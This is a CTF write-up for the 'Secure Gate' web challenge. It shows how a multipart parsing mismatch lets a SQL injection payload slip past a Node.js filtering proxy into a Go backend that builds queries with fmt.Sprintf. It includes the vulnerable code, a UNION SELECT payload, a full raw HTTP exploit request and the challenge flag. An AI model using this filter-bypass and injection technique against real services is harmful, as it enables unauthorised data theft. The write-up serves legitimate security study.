# Secure Gate Writeup

## Challenge

- Name: `Secure Gate`
- Category: `Web`
- Points: `185`
- URL: `http://35.194.108.145:55013`

The challenge is a simple note application behind a custom Node.js "security gateway". The gateway tries to detect SQL injection before forwarding requests to the Go backend.

## Recon

The provided source contains two services:

- `proxy/index.js`: an Express app that inspects requests and blocks SQLi-looking input.
- `backend/main.go`: a Go app serving the notes UI and API.

The interesting endpoint is `POST /api/notes/search`.

### Backend SQL injection

The backend parses multipart form data and reads the search term with:

```go
r.ParseMultipartForm(10 << 20)
q := r.FormValue("q")
```

It then escapes `%`, `_`, and `\`, but not quotes, and builds SQL with `fmt.Sprintf`:

```go
query := fmt.Sprintf(
    `SELECT id, title, content, created_at FROM notes WHERE content LIKE '%%%s%%' ESCAPE '\' ORDER BY created_at DESC`,
    pattern,
)
```

So `q` is directly injectable.

## The Intended Protection

The proxy reads the full request body, extracts user-controlled values, and rejects the request if any value matches one of several SQLi regexes.

For multipart requests it uses `busboy`:

```js
bb.on("field", (_name, value, info) => {
  values.push(value);
});

bb.on("file", (_name, stream, info) => {
  stream.resume();
  if (info.filename) values.push(info.filename);
});
```

Important detail:

- Multipart `field` values are inspected.
- Multipart `file` contents are not inspected at all.
- Only the filename of a file part is added to the filter input.

## Root Cause

The bug is a multipart parser differential between Node `busboy` and Go's `ParseMultipartForm`.

### How `busboy` behaves

If a multipart part has:

- `Content-Disposition: form-data; name="q"`
- `Content-Type: application/octet-stream`

then `busboy` treats it as a file part even when there is no `filename`.

That means the proxy does not inspect the part body, so the SQLi payload is invisible to the gateway.

### How Go behaves

Go's multipart parser treats parts without a real filename as normal form values when `FormValue("q")` is used.

So the backend still receives the body of that same part as the value of `q`.

Result:

- Proxy view: "this is a file; ignore its contents"
- Backend view: "this is form field `q`; use its contents in SQL"

That is the entire bypass.

## Exploitation

We send a handcrafted multipart request where `q` is hidden inside a part marked as `application/octet-stream`.

The injected search value is:

```sql
' UNION SELECT 999, value, value, value FROM secrets -- 
```

The backend query becomes a valid `UNION SELECT` and returns the flag from the `secrets` table as a fake note row.

## Proof of Concept

This request is enough:

```http
POST /api/notes/search HTTP/1.1
Host: 35.194.108.145:55013
Content-Type: multipart/form-data; boundary=x

--x
Content-Disposition: form-data; name="q"
Content-Type: application/octet-stream

' UNION SELECT 999, value, value, value FROM secrets -- 
--x--
```

The response includes:

```json
{
  "id": 999,
  "title": "tkbctf{...}",
  "content": "tkbctf{...}"
}
```

## Solver

A reproducible exploit script is included in [solve.py](solve.py).

Run:

```bash
python solve.py
```

## Flag

```text
tkbctf{cr0ss1ng_th3_b0und4ry_w1th_rfc2231}
```

## Takeaway

The lesson is that security filtering in a proxy is brittle when the proxy and backend do not parse requests identically. Here, a MIME/multipart interpretation mismatch let attacker-controlled data cross the "secure gate" unseen and reach a SQL injection sink.
